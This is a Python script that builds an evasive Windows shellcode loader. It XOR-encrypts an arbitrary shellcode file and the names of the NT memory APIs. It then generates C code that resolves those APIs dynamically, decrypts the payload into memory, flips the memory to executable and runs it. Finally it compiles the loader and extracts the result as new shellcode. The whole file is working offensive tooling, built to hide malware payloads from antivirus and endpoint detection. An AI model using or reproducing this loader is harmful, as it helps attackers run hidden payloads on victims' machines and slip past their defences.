import os
import sys
import subprocess
import random

if len(sys.argv) < 3:
    script_name = os.path.basename(sys.argv[0])
    print(f"Usage: {script_name} <shellcode.bin> <output.bin> [-l <key_length>] [-i <iterations>]")
    sys.exit(1)

bin_file = sys.argv[1]
output_bin = sys.argv[2]

# Defaults
key_length = 1
iterations = 1

# Parse optional length (-l)
if "-l" in sys.argv:
    l_index = sys.argv.index("-l")
    key_length = int(sys.argv[l_index + 1])
    if key_length < 1 or key_length > 2:
        print("Error: key length must be 1 or 2")
        sys.exit(1)

# Parse optional iterations (-i)
if "-i" in sys.argv:
    i_index = sys.argv.index("-i")
    iterations = int(sys.argv[i_index + 1])
    if iterations < 1:
        iterations = 1

with open(bin_file, "rb") as f:
    shellcode = f.read()

def xor_bytes(data: bytes, key: list[int]) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def xor_c_string(s: str, key: list[int]) -> bytes:
    data = s.encode() + b'\x00'
    return xor_bytes(data, key)

def bytes_to_c_array(b: bytes) -> str:
    return ",".join(f"0x{byte:02x}" for byte in b)

for it in range(iterations):
    # Generate new random key every iteration
    key = [random.randint(1, 255) for _ in range(key_length)]

    xor_shellcode = xor_bytes(shellcode, key)
    shellcode_array = bytes_to_c_array(xor_shellcode)
    key_array = bytes_to_c_array(key)

    # Strings to encrypt
    c_strings = ["ntdll.dll", "NtAllocateVirtualMemory", "NtProtectVirtualMemory"]
    xor_c_strings = [xor_c_string(s, key) for s in c_strings]

    # Compute offsets and stack buffer size
    offsets = []
    current_offset = 0
    for s in xor_c_strings:
        offsets.append(current_offset)
        current_offset += len(s)
    stackbuf_size = current_offset

    # Combined encrypted strings
    combined_array = bytes_to_c_array(b"".join(xor_c_strings))

    # Print the XOR key for this iteration
    print(f"[+] Iteration {it+1} complete (XOR key: {key_array})")

    c_code = f'''#include "winapi_loader.h"

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

__attribute__((section(".text"))) static unsigned char shellcode[] = {{ {shellcode_array} }};
__attribute__((section(".text"))) static unsigned char key[] = {{ {key_array} }};

__attribute__((section(".text.start")))
void _start() {{
    SIZE_T size = sizeof(shellcode);
    SIZE_T key_len = sizeof(key);

    unsigned char stackbuf[{stackbuf_size}];
    char* ntdll_dll               = (char*)&stackbuf[{offsets[0]}];
    char* ntallocatevirtualmemory  = (char*)&stackbuf[{offsets[1]}];
    char* ntprotectvirtualmemory   = (char*)&stackbuf[{offsets[2]}];

    __attribute__((section(".text"))) static unsigned char enc_strings[] = {{ {combined_array} }};
    for (SIZE_T i = 0; i < sizeof(enc_strings); i++)
        stackbuf[i] = enc_strings[i];

    for (SIZE_T i = 0; i < sizeof(stackbuf); i++)
        stackbuf[i] ^= key[i % key_len];

    HMODULE hNtdll = myLoadLibraryA(ntdll_dll);

    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory =
        (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory);

    NtProtectVirtualMemory_t pNtProtectVirtualMemory =
        (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);

    LPVOID execMemory = NULL;
    SIZE_T regionSize = size;
    NTSTATUS status;

    status = pNtAllocateVirtualMemory(
        (HANDLE)-1,
        &execMemory,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    for (SIZE_T i = 0; i < size; i++)
        ((unsigned char*)execMemory)[i] = shellcode[i] ^ key[i % key_len];

    ULONG oldProtect;
    status = pNtProtectVirtualMemory(
        (HANDLE)-1,
        &execMemory,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    ((void(*)())execMemory)();
}}
'''

# Compile C code
temp_exe = "temp_loader.exe"
compile_cmd = [
    "x86_64-w64-mingw32-gcc",
    "-s", "-nostdlib", "-nostartfiles", "-ffreestanding",
    "-fno-ident", "-Wl,-subsystem,windows", "-e", "_start",
    "-Os", "-fPIC", "-fno-asynchronous-unwind-tables",
    "-T", "linker.ld",
    "-x", "c", "-", "-o", temp_exe
]

proc = subprocess.run(compile_cmd, input=c_code.encode(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
if proc.returncode != 0:
    print("Compilation failed:\n", proc.stderr.decode())
    sys.exit(1)

# Extract only the .text section
objcopy_cmd = [
    "objcopy",
    "-O", "binary",
    "--only-section=.text",
    temp_exe,
    output_bin
]

proc = subprocess.run(objcopy_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
os.remove(temp_exe)

if proc.returncode != 0:
    print("objcopy failed:\n", proc.stderr.decode())
    sys.exit(1)

print(f"Shellcode generated: {output_bin}")
